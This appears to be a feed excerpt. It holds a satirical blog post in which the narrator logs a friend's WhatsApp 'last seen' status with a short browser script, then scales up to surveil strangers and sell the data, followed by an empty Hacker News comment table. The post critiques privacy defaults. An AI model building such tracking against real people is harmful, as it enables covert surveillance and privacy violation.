&lt;p&gt;WhatsApp does have some privacy settings. Users can chose whether to display their “last seen” to everyone, just their contacts, or no one. Fortunately and of course, the default for all of the privacy settings is to share everything with everyone, and few people think to tinker with them. WhatsApp seem to encourage openness in other ways too - only users who display their own “last seen” are allowed to see the “last seen” of others. In real life you have Groucho Marx glasses for when you want some privacy and anonymity, but the Groucho Marx glasses for the internet can be hard to find.&lt;/p&gt;
&lt;p&gt;Monitoring Steve Steveington on WhatsApp presents a different set of challenges to monitoring him on Facebook. Facebook sends data to your browser using straightforward HTTP requests that you can easily write a program to mimic. However, WhatsApp communicates with your browser using a much more complex Web Sockets-based protocol. You like to think of yourself as more of a generalist engineer, and something as esoteric and silly as Web Sockets falls outside of your definition of generalist. You decide instead to write a Chrome extension to watch and record the contents of your web.whatsapp.com activity. You manage to do this in 4 lines of Javascript.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;setInterval(function() {
  var lastSeen = $('.pane-header .chat-body .emojitext').last().text();
  console.log(Math.floor(Date.now() / 1000) + &quot;, &quot; + lastSeen);
}, 1000);
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You sign in to web.whatsapp.com on your old laptop which still works except you have to use an external mouse and the left shift key has fallen off. You set your Chrome extension running and hide the laptop under your bed. You come back a week later and see what Steve Steveington has been up to. You copy and paste the output from the developer console and draw a couple of graphs.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;img src=&quot;https://robertheaton.com/images/whatsapptrackersleep.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The conniving rogue has been playing you for a fool. You are disappointed but not surprised. You confront him with your evidence. Harsh words and exchanged and not taken back. The 5km charity walk team disbands in a cloud of acrimony and recrimination.&lt;/p&gt;
&lt;p&gt;With even more time on your hands than ever before, you go just a bit mad and start monitoring any and every phone number you can find. You start to build up a detailed record of your accountant’s sleep patterns. You wonder what it is that she gets up to until two am every Wednesday. You build some interesting graphs of the WhatsApp usage patterns of some of your exes. You wonder what it is that causes them to send so many messages during some weeks, but almost none during others. One of your friends plays squash with Vanilla Ice and has his phone number. You investigate and it turns out that Vanilla has never adjusted his WhatsApp privacy settings. Also the dude NEVER seems to go to sleep. You’re dying to know whether your friends Lara and Tara are secretly dating. You can’t help but write multi-variate cross-correlation software that shows a striking alignment between their WhatsApp usage patterns.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;img src=&quot;https://robertheaton.com/images/whatsapptrackercorrelation.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;You start to expand your monitoring capacity. You register some more phone numbers and buy some more laptops to expand your bandwidth. You start learning more about the protocol that WhatsApp uses to communicate with your browser, and in the meantime set up some headless browsers that click through and record multiple conversations automatically. Where possible you combine WhatsApp status data with status data from Facebook to give an even more complete picture.&lt;/p&gt;
&lt;p&gt;You start a company that runs a service that takes a phone number and returns WhatsApp usage for that number. You sell this information to health insurers and credit agencies, who are both very suspicious of people who are awake at 4am. In order to scale the company you get the 5km charity walk team back together and reconcile with Steve Steveington, who happens to be an expert in distributed systems engineering. The day of the 5km charity walk comes, but you have both been up all night working on your Java bindings and sleep right through it.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;UPDATE 2017-10-09: after you share your story on the internet, it is pointed out to you that whilst Steve can hide his WhatsApp “last seen at”, he _cannot_ hide his “online” status. You update your tools to monitor whether people are “online” or not, rather than relying on “last seen at”. There is now no way at all for WhatsApp users to defend against your monitoring, and your company valuation skyrockets.&lt;/em&gt;&lt;/p&gt;
&lt;section class=&quot;share-links&quot;&gt;


&lt;/section&gt;&lt;section&gt;&lt;h3&gt;Get more posts like this:&lt;/h3&gt;

&lt;/section&gt;&lt;hr/&gt;&lt;h3&gt;More posts on The Adventures of Steve Steveington&lt;/h3&gt;
&lt;section class=&quot;navigation&quot;&gt;
&lt;/section&gt;</description>
<pubDate>Mon, 09 Oct 2017 17:39:19 +0000</pubDate>
<dc:creator>robheaton</dc:creator>
<og:image>http://robertheaton.com/images/icon.png</og:image>
<og:url>http://robertheaton.com/2017/10/09/tracking-friends-and-strangers-using-whatsapp/</og:url>
<og:type>article</og:type>
<og:title>Tracking friends and strangers using WhatsApp | Robert Heaton</og:title>
<og:description>You and your good buddy, Steve Steveington, are in training for an arduous charity walk. You signed up together on the spur of the moment and pledged to hold each other accountable whilst you got i...</og:description>
<dc:format>text/html</dc:format>
<dc:identifier>https://robertheaton.com/2017/10/09/tracking-friends-and-strangers-using-whatsapp/</dc:identifier>
</item>
<item>
<title>Ask HN: How and where can I publish my research on AI as a college dropout?</title>
<link>https://news.ycombinator.com/item?id=15435371</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=15435371</guid>
<description>
&lt;table border=&quot;0&quot; class=&quot;comment-tree&quot; readability=&quot;242.95815158124&quot;&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435680&quot; readability=&quot;22.612018977333&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;11.306009488666&quot;&gt;&lt;tr readability=&quot;22.612018977333&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;21.137322087507&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435831&quot; readability=&quot;6.491935483871&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2459677419355&quot;&gt;&lt;tr readability=&quot;6.491935483871&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.1008064516129&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436008&quot; readability=&quot;2.5443037974684&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2721518987342&quot;&gt;&lt;tr readability=&quot;2.5443037974684&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436458&quot; readability=&quot;2.4375&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.21875&quot;&gt;&lt;tr readability=&quot;2.4375&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437984&quot; readability=&quot;3.3783783783784&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6891891891892&quot;&gt;&lt;tr readability=&quot;3.3783783783784&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436107&quot; readability=&quot;1.1940298507463&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437926&quot; readability=&quot;3.3202614379085&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6601307189542&quot;&gt;&lt;tr readability=&quot;3.3202614379085&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438005&quot; readability=&quot;2.1702127659574&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439336&quot; readability=&quot;4.385593220339&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.1927966101695&quot;&gt;&lt;tr readability=&quot;4.385593220339&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.0169491525424&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438423&quot; readability=&quot;1.3333333333333&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436102&quot; readability=&quot;13.785714285714&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.8928571428571&quot;&gt;&lt;tr readability=&quot;13.785714285714&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;19.69387755102&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436007&quot; readability=&quot;19.766260162602&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;9.8831300813008&quot;&gt;&lt;tr readability=&quot;19.766260162602&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;21.742886178862&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435883&quot; readability=&quot;13.692712906058&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.846356453029&quot;&gt;&lt;tr readability=&quot;13.692712906058&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;13.203687445127&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439952&quot; readability=&quot;5.034965034965&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.5174825174825&quot;&gt;&lt;tr readability=&quot;5.034965034965&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435769&quot; readability=&quot;8.2849315068493&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.1424657534247&quot;&gt;&lt;tr readability=&quot;8.2849315068493&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.0630136986301&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436527&quot; readability=&quot;10.663043478261&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.3315217391304&quot;&gt;&lt;tr readability=&quot;10.663043478261&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;10.178359683794&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436984&quot; readability=&quot;4.156976744186&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.078488372093&quot;&gt;&lt;tr readability=&quot;4.156976744186&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437047&quot; readability=&quot;6.4005524861878&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2002762430939&quot;&gt;&lt;tr readability=&quot;6.4005524861878&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437314&quot; readability=&quot;7.2368421052632&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.6184210526316&quot;&gt;&lt;tr readability=&quot;7.2368421052632&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.9753289473684&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437526&quot; readability=&quot;6.1285140562249&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.0642570281124&quot;&gt;&lt;tr readability=&quot;6.1285140562249&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438337&quot; readability=&quot;3.5725190839695&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7862595419847&quot;&gt;&lt;tr readability=&quot;3.5725190839695&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439267&quot; readability=&quot;9.5419847328244&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7709923664122&quot;&gt;&lt;tr readability=&quot;9.5419847328244&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;280&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;9.0648854961832&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439408&quot; readability=&quot;9.2746113989637&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.6373056994819&quot;&gt;&lt;tr readability=&quot;9.2746113989637&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;320&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.0284974093264&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437436&quot; readability=&quot;9.5514018691589&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7757009345794&quot;&gt;&lt;tr readability=&quot;9.5514018691589&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.1635514018692&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15440106&quot; readability=&quot;1.3225806451613&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438829&quot; readability=&quot;4.785046728972&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.392523364486&quot;&gt;&lt;tr readability=&quot;4.785046728972&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.1775700934579&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438834&quot; readability=&quot;3.3185185185185&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6592592592593&quot;&gt;&lt;tr readability=&quot;3.3185185185185&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435966&quot; readability=&quot;13.484464902186&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.7422324510932&quot;&gt;&lt;tr readability=&quot;13.484464902186&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;14.447640966628&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435497&quot; readability=&quot;0.97619047619048&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435467&quot; readability=&quot;3.5156950672646&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7578475336323&quot;&gt;&lt;tr readability=&quot;3.5156950672646&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435674&quot; readability=&quot;1.9285714285714&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435701&quot; readability=&quot;5.232&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.616&quot;&gt;&lt;tr readability=&quot;5.232&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435724&quot; readability=&quot;3.5294117647059&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7647058823529&quot;&gt;&lt;tr readability=&quot;3.5294117647059&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436630&quot; readability=&quot;7.2490974729242&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.6245487364621&quot;&gt;&lt;tr readability=&quot;7.2490974729242&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.3429602888087&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436103&quot; readability=&quot;8.6108786610879&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.3054393305439&quot;&gt;&lt;tr readability=&quot;8.6108786610879&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;9.0892608089261&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438161&quot; readability=&quot;9.8817480719794&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.9408740359897&quot;&gt;&lt;tr readability=&quot;9.8817480719794&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;18.775321336761&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438578&quot; readability=&quot;11.531981279251&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.7659906396256&quot;&gt;&lt;tr readability=&quot;11.531981279251&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;10.090483619345&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438645&quot; readability=&quot;15.770684039088&quot;&gt;&lt;td&gt;
